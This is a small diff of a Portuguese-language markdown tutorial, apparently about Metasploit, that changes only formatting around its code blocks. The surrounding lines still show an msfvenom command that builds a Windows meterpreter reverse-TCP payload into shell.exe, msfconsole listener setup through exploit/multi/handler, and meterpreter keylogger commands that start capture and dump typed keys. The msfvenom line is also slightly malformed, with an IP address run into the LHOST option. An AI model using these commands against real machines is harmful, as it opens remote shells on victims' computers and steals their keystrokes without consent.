@@ -10,8 +10,8 @@ date: 2016-07-12T14:54:44.000Z
 ```msfvenom -p windows/meterpreter/reverse_tcp 192.168.0.104LHOST=(SeuIP) LPORT=443 -f exe > /root/Desktop/shell.exe```
 
 -Comandos para configurar o modo Listening:
-```
 
+```
 msfconsole
 
 use exploit/multi/handler
@@ -52,6 +52,8 @@ Executar um programa:
 
 Keylogger:
  
+ 
+
  ```
 meterpreter > keyscan_start INICIA O KEYLOGGER
 meterpreter > keyscan_dump EXIBE AS TECLAS DIGITADAS
